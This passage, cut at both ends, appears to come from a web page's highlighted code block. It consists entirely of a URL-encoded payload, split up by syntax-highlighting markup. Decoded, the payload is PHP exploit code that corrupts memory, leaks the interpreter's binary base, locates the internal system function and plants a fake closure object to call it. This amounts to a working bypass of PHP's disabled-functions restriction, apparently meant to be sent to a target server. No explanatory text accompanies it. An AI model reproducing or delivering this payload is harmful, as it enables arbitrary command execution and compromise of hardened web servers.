class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">63</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">36</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">61</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">43</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">43</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">45</span>%<span class="hljs-number">4</span>c%<span class="hljs-number">46</span>%<span class="hljs-number">20</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">43</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">43</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">64</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">64</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">64</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span 